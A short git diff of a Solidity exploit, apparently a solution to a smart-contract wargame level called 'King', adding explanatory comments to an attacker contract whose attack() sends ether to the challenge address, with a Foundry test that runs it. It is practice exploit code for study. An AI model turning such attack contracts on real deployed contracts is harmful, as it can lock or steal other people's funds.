@@ -12,6 +12,9 @@ contract KingAttacker {
   }
 
   function attack() external {
+    // will be able to be king, as msg.value = prize
+    // as the owner contract do have a receive() function,
+    // they will be able to get their price.
     (bool result,) = challengeAddress.call{value: 0.001 ether}("");
     result;
   }
@@ -31,7 +34,6 @@ contract KingTest is Test {
 
   function testExploit() public {
     attackerContract.attack();
-
     utils.submitLevelInstance(challengeAddress);
   }
 }
